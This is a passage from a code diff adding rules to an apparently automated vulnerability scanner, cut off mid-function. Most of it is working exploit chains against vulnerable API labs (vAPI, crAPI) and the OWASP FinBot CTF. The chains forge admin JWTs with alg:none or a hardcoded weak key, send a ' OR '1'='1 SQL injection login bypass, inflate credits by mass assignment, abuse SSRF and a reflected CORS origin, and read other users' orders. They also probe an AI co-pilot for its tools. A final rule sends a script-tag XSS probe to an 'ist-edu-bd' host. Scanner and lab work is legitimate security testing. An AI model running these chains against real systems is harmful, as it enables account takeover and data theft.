+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api1\/user/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi1BolaLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api1/user route scan — GET /api1/user/1 with new user token returns Michaels flag — BOLA oracle (API1)"
+    }
+  };
+};
+
+const vapiApi2RouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api2\/user/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi2BrokenAuthLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api2/user route scan — credential-stuffing login and GET /api2/user/details dumps every user with flag — broken authentication oracle (API2)"
+    }
+  };
+};
+
+const vapiApi6RouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api6\/user/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi6MassAssignmentLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api6/user route scan — POST credit inflation and GET /api6/user/me returns flag — mass assignment oracle (API6)"
+    }
+  };
+};
+
+const vapiApi10LoggingLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const flagUrl = new URL("/vapi/api10/user/flag", vapiCanonicalOrigin(ctx)).toString();
+  const doc = await ctx.probe.get(flagUrl, { maxBytes: 2048, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const flagMatch = doc.body.match(/flag\{api10_[^"]+/i);
+  const noLoggingMsg = /didn.?t log and monitor|logging and monitoring/i.test(doc.body);
+  if (!flagMatch && !noLoggingMsg) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.9,
+    evidence: {
+      flagUrl,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "vAPI GET /api10/user/flag returns challenge flag without authentication — insufficient logging and monitoring oracle (API10)"
+    }
+  };
+};
+
+const vapiApi10RouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api10\//i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi10LoggingLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api10/user route scan — GET /api10/user/flag returns flag without auth — insufficient logging and monitoring oracle (API10)"
+    }
+  };
+};
+
+const VAPI_JWT_HS256_KEY = "YouNeverGonnaGetThisOne";
+
+async function vapiProbeAdminJwt(ctx: RuleContext): Promise<string | null> {
+  const username = `thugir_jwt_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  const registerUrl = new URL("/vapi/jwt/user", vapiCanonicalOrigin(ctx)).toString();
+  const regDoc = await ctx.probe.get(registerUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password: "ThugirProbe123!" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 1024,
+    timeoutMs: 15000
+  });
+  const now = Math.floor(Date.now() / 1000);
+  const adminClaims = { iss: "vapi", aud: "vapi", role: "admin", iat: now, exp: now + 1800 };
+  const candidates: string[] = [buildAlgNoneJwt(adminClaims)];
+  const tokenMatch = regDoc.body.match(/"token"\s*:\s*"([^"]+)"/);
+  if (tokenMatch) {
+    const decoded = decodeJwt(tokenMatch[1]);
+    if (decoded?.payload) {
+      candidates.push(
+        buildHs256Jwt({ ...decoded.payload, role: "admin", exp: now + 1800 }, VAPI_JWT_HS256_KEY)
+      );
+    }
+  }
+  candidates.push(buildHs256Jwt(adminClaims, VAPI_JWT_HS256_KEY));
+  const probeUrl = new URL("/vapi/jwt/user", vapiCanonicalOrigin(ctx)).toString();
+  for (const token of candidates) {
+    const doc = await ctx.probe.get(probeUrl, {
+      maxBytes: 2048,
+      timeoutMs: 15000,
+      headers: { "Authorization-Token": token }
+    });
+    if (doc.status < 200 || doc.status >= 400) continue;
+    if (!/"success"\s*:\s*"true"/i.test(doc.body)) continue;
+    if (/flag\{jwt_/i.test(doc.body) || /"text"\s*:\s*"flag\{/i.test(doc.body)) return token;
+  }
+  return null;
+}
+
+const vapiJwtWeakTokenLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/vapi/jwt/user", vapiCanonicalOrigin(ctx)).toString();
+  const token = await vapiProbeAdminJwt(ctx);
+  if (!token) return NEGATIVE;
+  const doc = await ctx.probe.get(probeUrl, {
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    headers: { "Authorization-Token": token }
+  });
+  const flagMatch = doc.body.match(/flag\{jwt_[^"}\s]+/i);
+  if (!flagMatch) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl,
+      flagSnippet: flagMatch[0].slice(0, 80),
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "vAPI GET /jwt/user accepts forged admin JWT (alg:none or HS256 re-sign with known weak key) and returns flag — JustWeakToken oracle"
+    }
+  };
+};
+
+const vapiJwtRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/jwt\/user/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiJwtWeakTokenLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /jwt/user route scan — forged admin JWT returns flag{jwt_*} — JustWeakToken JWT bypass oracle"
+    }
+  };
+};
+
+const vapiServerSurferLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const blockedUrl = new URL("/vapi/serversurfer", vapiCanonicalOrigin(ctx));
+  blockedUrl.searchParams.set("url", "http://127.0.0.1");
+  const blockedDoc = await ctx.probe.get(blockedUrl.toString(), {
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (!/Whoa!!! Not Allowed!!|"success"\s*:\s*"false"/i.test(blockedDoc.body)) return NEGATIVE;
+  const probeUrl = new URL("/vapi/serversurfer", vapiCanonicalOrigin(ctx));
+  probeUrl.searchParams.set("url", "http://example.com/");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 65536, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"success"\s*:\s*"true"/i.test(doc.body)) return NEGATIVE;
+  const dataMatch = doc.body.match(/"data"\s*:\s*"([A-Za-z0-9+/=]+)"/);
+  if (!dataMatch) return NEGATIVE;
+  let decoded = "";
+  try {
+    decoded = Buffer.from(dataMatch[1], "base64").toString("utf8");
+  } catch {
+    return NEGATIVE;
+  }
+  if (!/Example Domain|example\.com|<html/i.test(decoded)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: probeUrl.toString(),
+      blockedUrl: blockedUrl.toString(),
+      decodedSnippet: decoded.slice(0, 160).trim(),
+      note: "vAPI GET /serversurfer?url= fetches attacker-controlled URLs server-side (blocks 127.0.0.1 but accepts example.com) — ServerSurfer SSRF oracle"
+    }
+  };
+};
+
+const vapiServerSurferRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/serversurfer/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiServerSurferLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /serversurfer route scan — GET ?url= fetches external URLs server-side — ServerSurfer SSRF oracle"
+    }
+  };
+};
+
+const vapiStickyNotesStoredXssLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const probeUrl = new URL("/vapi/stickynotes", vapiCanonicalOrigin(ctx));
+  probeUrl.searchParams.set("format", "html");
+  const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<script[\s>]/i.test(doc.body)) return NEGATIVE;
+  const flagMatch = doc.body.match(/flag\{xss_[^}<]+/i);
+  const storedScript = /<note>[\s\S]*?<script/i.test(doc.body);
+  if (!flagMatch && !storedScript) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.91,
+    evidence: {
+      url: probeUrl.toString(),
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "vAPI GET /stickynotes?format=html returns stored <script> payloads unescaped in XML notes including flag{xss_*} — StickyNotes stored XSS oracle"
+    }
+  };
+};
+
+const vapiStickyNotesRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/stickynotes/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiStickyNotesStoredXssLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /stickynotes route scan — format=html returns stored script payloads and flag{xss_*} — StickyNotes stored XSS oracle"
+    }
+  };
+};
+
+const vapiApi6MassAssignmentLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const username = `thugir_ma6_${Date.now()}`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/vapi/api6/user", vapiCanonicalOrigin(ctx)).toString();
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password, credit: 10000 }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 400) return NEGATIVE;
+  const token = vapiBasicAuthToken(username, password);
+  const meUrl = new URL("/vapi/api6/user/me", vapiCanonicalOrigin(ctx)).toString();
+  const meDoc = await ctx.probe.get(meUrl, {
+    headers: { "Authorization-Token": token },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (meDoc.status < 200 || meDoc.status >= 400) return NEGATIVE;
+  if (!/"credit"\s*:\s*"10000"/.test(meDoc.body)) return NEGATIVE;
+  const flagMatch = meDoc.body.match(/flag\{api6_[^"]+/i);
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.92,
+    evidence: {
+      createUrl,
+      meUrl,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: meDoc.body.slice(0, 160).trim(),
+      note: "vAPI POST /api6/user accepts attacker-controlled credit field and GET /api6/user/me returns 10000 credits with flag — mass assignment oracle (API6)"
+    }
+  };
+};
+
+const VAPI_API8_SQLI_PAYLOAD = { username: "' OR '1'='1", password: "' OR '1'='1" };
+
+const vapiApi8SqliLoginLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const loginUrl = new URL("/vapi/api8/user/login", vapiCanonicalOrigin(ctx)).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    method: "POST",
+    body: JSON.stringify(VAPI_API8_SQLI_PAYLOAD),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 400) return NEGATIVE;
+  if (!/"success"\s*:\s*"true"/i.test(loginDoc.body)) return NEGATIVE;
+  const keyMatch = loginDoc.body.match(/"authkey"\s*:\s*"([^"]{8,})"/);
+  if (!keyMatch) return NEGATIVE;
+  const secretUrl = new URL("/vapi/api8/user/secret", vapiCanonicalOrigin(ctx)).toString();
+  const secretDoc = await ctx.probe.get(secretUrl, {
+    headers: { "Authorization-Token": keyMatch[1] },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (secretDoc.status < 200 || secretDoc.status >= 400) return NEGATIVE;
+  const flagMatch = secretDoc.body.match(/flag\{api8_[^"]+/i);
+  if (!flagMatch && !/"secret"\s*:/.test(secretDoc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.92,
+    evidence: {
+      loginUrl,
+      secretUrl,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: secretDoc.body.slice(0, 160).trim(),
+      note: "vAPI POST /api8/user/login accepts SQL injection `' OR '1'='1` bypass and /api8/user/secret dumps admin flag — SQL injection authentication bypass oracle (API8)"
+    }
+  };
+};
+
+const vapiApi8SecretRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api8\/user\/secret/i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi8SqliLoginLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api8/user/secret route scan — SQLi login bypass returns admin secret flag{api8_*} — API8 injection route oracle"
+    }
+  };
+};
+
+const VAPI_API7_CORS_PROBE_ORIGIN = "https://evil-cors-probe.example";
+
+function vapiSessionCookieFromDoc(doc: { setCookies: string[] }): string | null {
+  return doc.setCookies.find((c) => /^PHPSESSID=/i.test(c))?.split(";")[0] ?? null;
+}
+
+const vapiApi7CorsMisconfigLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const username = `thugir_api7_${Date.now()}`;
+  const password = "ThugirProbe123!";
+  const createUrl = new URL("/vapi/api7/user", vapiCanonicalOrigin(ctx)).toString();
+  const createDoc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: JSON.stringify({ username, password }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  if (createDoc.status < 200 || createDoc.status >= 400) return NEGATIVE;
+  const token = vapiBasicAuthToken(username, password);
+  const loginUrl = new URL("/vapi/api7/user/login", vapiCanonicalOrigin(ctx)).toString();
+  const loginDoc = await ctx.probe.get(loginUrl, {
+    headers: { "Authorization-Token": token },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  const sessionCookie = vapiSessionCookieFromDoc(loginDoc);
+  if (!sessionCookie) return NEGATIVE;
+  const keyUrl = new URL("/vapi/api7/user/key", vapiCanonicalOrigin(ctx)).toString();
+  const keyHeaders = {
+    Cookie: sessionCookie,
+    "Authorization-Token": token,
+    Origin: VAPI_API7_CORS_PROBE_ORIGIN
+  };
+  let keyDoc = await ctx.probe.get(keyUrl, {
+    maxBytes: 2048,
+    timeoutMs: 15000,
+    headers: keyHeaders
+  });
+  if (keyDoc.status === 403 && /userNotLoggedIn/i.test(keyDoc.body)) {
+    await new Promise((r) => setTimeout(r, 800));
+    keyDoc = await ctx.probe.get(keyUrl, {
+      maxBytes: 2048,
+      timeoutMs: 15000,
+      headers: keyHeaders
+    });
+  }
+  if (keyDoc.status < 200 || keyDoc.status >= 400) return NEGATIVE;
+  const acao = (keyDoc.headers["access-control-allow-origin"] || "").trim();
+  if (acao !== VAPI_API7_CORS_PROBE_ORIGIN) return NEGATIVE;
+  const creds = (keyDoc.headers["access-control-allow-credentials"] || "").toLowerCase() === "true";
+  if (!creds) return NEGATIVE;
+  if (!/"authkey"\s*:/.test(keyDoc.body) && !/flag\{api7_/i.test(keyDoc.body)) return NEGATIVE;
+  const flagMatch = keyDoc.body.match(/flag\{api7_[^"]+/i);
+  return {
+    fired: true,
+    confidence: flagMatch ? 0.94 : 0.92,
+    evidence: {
+      createUrl,
+      loginUrl,
+      keyUrl,
+      allowOrigin: acao,
+      allowCredentials: creds,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: keyDoc.body.slice(0, 200).trim(),
+      note: "vAPI GET /api7/user/key reflects arbitrary Origin with Access-Control-Allow-Credentials and returns authkey — CORS misconfiguration oracle (API7)"
+    }
+  };
+};
+
+const vapiApi7CorsRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api7\//i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi7CorsMisconfigLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api7 route scan — GET /api7/user/key reflects arbitrary Origin with Access-Control-Allow-Credentials and returns authkey — CORS misconfiguration oracle (API7)"
+    }
+  };
+};
+
+const VAPI_API9_KNOWN_USER = "richardbranson";
+const VAPI_API9_KNOWN_PIN = "1655";
+
+function vapiProbeHasRateLimitHeader(headers: Record<string, string>): boolean {
+  return Object.keys(headers).some((k) => /ratelimit/i.test(k));
+}
+
+const vapiApi9ImproperInventoryLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const base = vapiCanonicalOrigin(ctx);
+  const v2Url = new URL("/vapi/api9/v2/user/login", base).toString();
+  const v2Doc = await ctx.probe.get(v2Url, {
+    method: "POST",
+    body: JSON.stringify({ username: VAPI_API9_KNOWN_USER, pin: "0000" }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 512,
+    timeoutMs: 15000
+  });
+  const v2RateLimited = vapiProbeHasRateLimitHeader(v2Doc.headers);
+  const v1Url = new URL("/vapi/api9/v1/user/login", base).toString();
+  const v1Doc = await ctx.probe.get(v1Url, {
+    method: "POST",
+    body: JSON.stringify({ username: VAPI_API9_KNOWN_USER, pin: VAPI_API9_KNOWN_PIN }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 2048,
+    timeoutMs: 15000
+  });
+  if (v1Doc.status < 200 || v1Doc.status >= 400) return NEGATIVE;
+  const flagMatch = v1Doc.body.match(/flag\{api9_[^"]+/i);
+  if (!flagMatch && !/"accbalance"\s*:\s*"flag\{/i.test(v1Doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: flagMatch && v2RateLimited ? 0.94 : flagMatch ? 0.92 : 0.9,
+    evidence: {
+      v1Url,
+      v2Url,
+      v2HasRateLimit: v2RateLimited,
+      flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
+      snippet: v1Doc.body.slice(0, 200).trim(),
+      note: "vAPI POST /api9/v1/user/login accepts deprecated v1 login without rate limiting and returns flag — improper inventory management oracle (API9)"
+    }
+  };
+};
+
+const vapiApi9RouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api9\//i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi9ImproperInventoryLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api9 route scan — deprecated /v1/user/login lacks v2 rate limiting and returns flag{api9_*} with known PIN — improper inventory management oracle (API9)"
+    }
+  };
+};
+
+const crapi2ShopOrdersAllRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapi2Host(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/shop\/orders\/all/i.test(pageUrl)) return NEGATIVE;
+  const jwt = await tryApiLabJwt(ctx);
+  if (!jwt) return NEGATIVE;
+  const ordersUrl = new URL("/workshop/api/shop/orders/all", ctx.origin).toString();
+  const doc = await ctx.probe.get(ordersUrl, {
+    maxBytes: 16384,
+    timeoutMs: 20000,
+    headers: { Authorization: `Bearer ${jwt}` }
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/"orders"\s*:/.test(doc.body)) return NEGATIVE;
+  try {
+    const data = JSON.parse(doc.body) as { orders?: Array<{ id?: number; user?: { email?: string } }> };
+    const orders = data.orders;
+    if (!Array.isArray(orders) || orders.length < 2) return NEGATIVE;
+    const emails = [...new Set(orders.map((o) => o.user?.email).filter(Boolean))];
+    return {
+      fired: true,
+      confidence: 0.93,
+      evidence: {
+        scannedUrl: pageUrl,
+        ordersUrl,
+        orderCount: orders.length,
+        distinctEmails: emails.slice(0, 4),
+        snippet: doc.body.slice(0, 200).trim(),
+        note: "crAPI v2 GET /workshop/api/shop/orders/all returns bulk order history for authenticated regular user — BFLA/excessive data exposure oracle (API3)"
+      }
+    };
+  } catch {
+    return NEGATIVE;
+  }
+};
+
+const crapi2ShopOrdersIdBolaRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapi2Host(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const orderMatch = pageUrl.match(/\/shop\/orders\/(\d+)/i);
+  if (!orderMatch || /\/all\b/i.test(pageUrl)) return NEGATIVE;
+  const orderId = orderMatch[1];
+  const jwt = await tryApiLabJwt(ctx);
+  if (!jwt) return NEGATIVE;
+  const result = await probeCrapiShopOrdersIdBola(ctx, orderId, jwt);
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: `crAPI v2 GET /workshop/api/shop/orders/${orderId} returns another user's order for authenticated test@test.com — BOLA route oracle (API1)`
+    }
+  };
+};
+
+const crapiShopOrdersIdBolaRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCrapi1Host(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  const orderMatch = pageUrl.match(/\/shop\/orders\/(\d+)/i);
+  if (!orderMatch || /\/all\b/i.test(pageUrl)) return NEGATIVE;
+  const orderId = orderMatch[1];
+  const jwt = await tryCrapiLabJwt(ctx);
+  if (!jwt) return NEGATIVE;
+  const callerEmail = jwtSubjectEmail(jwt) ?? "";
+  const result = await probeCrapiShopOrdersIdBola(ctx, orderId, jwt, callerEmail || "scanner.local");
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: `crAPI v1 GET /workshop/api/shop/orders/${orderId} returns another user's order — shop orders route BOLA oracle (API1)`
+    }
+  };
+};
+
+function isFinbotCtfHost(ctx: RuleContext): boolean {
+  return /owasp-finbot-ctf\.org/i.test(ctx.origin);
+}
+
+const finbotCtfChallengesRouteLiveOracle: Rule = async (ctx) => {
+  if (!isFinbotCtfHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/(?:ctf|portals)(?:\/|$)/i.test(pageUrl)) return NEGATIVE;
+  const challengesUrl = new URL("/ctf/api/v1/challenges", ctx.origin).toString();
+  const doc = await ctx.probe.get(challengesUrl, { maxBytes: 65536, timeoutMs: 20000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  let challenges: Array<{
+    id?: string;
+    subcategory?: string;
+    labels?: Record<string, string[]>;
+  }>;
+  try {
+    challenges = JSON.parse(doc.body);
+  } catch {
+    return NEGATIVE;
+  }
+  if (!Array.isArray(challenges) || challenges.length < 5) return NEGATIVE;
+  const promptInjection = challenges.filter(
+    (c) =>
+      c.subcategory === "system_prompt_leak" ||
+      /prompt injection/i.test(JSON.stringify(c.labels ?? {}))
+  );
+  if (promptInjection.length < 1) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      scannedUrl: pageUrl,
+      challengesUrl,
+      challengeCount: challenges.length,
+      promptInjectionChallenges: promptInjection.slice(0, 4).map((c) => c.id),
+      snippet: doc.body.slice(0, 200).trim(),
+      note: "OWASP FinBot CTF exposes agentic prompt-injection challenges (system_prompt_leak) via public /ctf/api/v1/challenges — recon-onboarding/invoice oracle"
+    }
+  };
+};
+
+const finbotCtfSidecarRouteLiveOracle: Rule = async (ctx) => {
+  if (!isFinbotCtfHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/ctf(?:\/|$)/i.test(pageUrl)) return NEGATIVE;
+  const result = await probeFinbotCtfSidecar(ctx);
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+async function probeFinbotCtfSidecar(ctx: RuleContext): Promise<RuleResult | null> {
+  const sidecarUrl = new URL("/ctf/api/v1/sidecar", ctx.origin).toString();
+  const doc = await ctx.probe.get(sidecarUrl, { maxBytes: 8192, timeoutMs: 20000 });
+  if (doc.status < 200 || doc.status >= 400) return null;
+  try {
+    const data = JSON.parse(doc.body) as { total?: number; completed?: number; points?: number };
+    if (typeof data.total !== "number" || data.total < 5) return null;
+    return {
+      fired: true,
+      confidence: 0.9,
+      evidence: {
+        sidecarUrl,
+        totalChallenges: data.total,
+        completed: data.completed,
+        points: data.points,
+        snippet: doc.body.slice(0, 160).trim(),
+        note: "OWASP FinBot public /ctf/api/v1/sidecar exposes agentic challenge progress and toolkit metadata"
+      }
+    };
+  } catch {
+    return null;
+  }
+}
+
+async function finbotPageCsrfBootstrap(
+  ctx: RuleContext,
+  path: string
+): Promise<{ cookie: string; csrf: string } | null> {
+  const pageUrl = new URL(path, ctx.origin).toString();
+  const doc = await ctx.probe.get(pageUrl, { maxBytes: 65536, timeoutMs: 20000 });
+  if (doc.status < 200 || doc.status >= 400) return null;
+  const csrfMatch = doc.body.match(/<meta\s+name=["']csrf-token["']\s+content=["']([^"']+)["']/i);
+  if (!csrfMatch) return null;
+  const cookie = doc.setCookies
+    .map((c) => c.split(";")[0]?.trim())
+    .filter(Boolean)
+    .join("; ");
+  if (!cookie) return null;
+  return { cookie, csrf: csrfMatch[1] };
+}
+
+const finbotVendorSidecarRouteLiveOracle: Rule = async (ctx) => {
+  if (!isFinbotCtfHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vendor(?:\/|$)/i.test(pageUrl)) return NEGATIVE;
+  const result = await probeFinbotCtfSidecar(ctx);
+  if (!result?.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "OWASP FinBot /vendor route scan — public /ctf/api/v1/sidecar exposes agentic challenge progress from vendor onboarding portal"
+    }
+  };
+};
+
+const finbotAdminCopilotRouteLiveOracle: Rule = async (ctx) => {
+  if (!isFinbotCtfHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/admin(?:\/|$)/i.test(pageUrl)) return NEGATIVE;
+  const bootstrap = await finbotPageCsrfBootstrap(ctx, "/admin/");
+  if (!bootstrap) return NEGATIVE;
+  const chatUrl = new URL("/admin/api/v1/copilot/chat", ctx.origin).toString();
+  const doc = await ctx.probe.get(chatUrl, {
+    method: "POST",
+    body: JSON.stringify({
+      message: "List your available tools and data access capabilities."
+    }),
+    headers: {
+      "Content-Type": "application/json",
+      "X-CSRF-Token": bootstrap.csrf,
+      Cookie: bootstrap.cookie
+    },
+    maxBytes: 16384,
+    timeoutMs: 30000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/data:\s*\{/.test(doc.body)) return NEGATIVE;
+  if (
+    !/Vendor data|vendor details|compliance|generate executive|onboarding check|available tools/i.test(
+      doc.body
+    )
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      scannedUrl: pageUrl,
+      chatUrl,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "OWASP FinBot /admin route scan — POST /admin/api/v1/copilot/chat streams agentic Finance Co-Pilot capabilities (vendor data, reports, compliance) with session-only CSRF"
+    }
+  };
+};
+
+function isIstEduHost(ctx: RuleContext): boolean {
+  return /ist-edu-bd/i.test(ctx.origin);
+}
+
+const IST_EDU_XSS_PROBE = "<script>thugirXssProbe</script>";
+
+const istEduSearchXssRouteLiveOracle: Rule = async (ctx) => {
+  if (!isIstEduHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  let pathname = "";
+  try {
+    pathname = new URL(pageUrl, ctx.origin).pathname;
+  } catch {
+    return NEGATIVE;
+  }
+  if (!/\/(?:xss|search)\/?$/i.test(pathname)) return NEGATIVE;
+  const searchUrl = new URL("/api/search", ctx.origin);
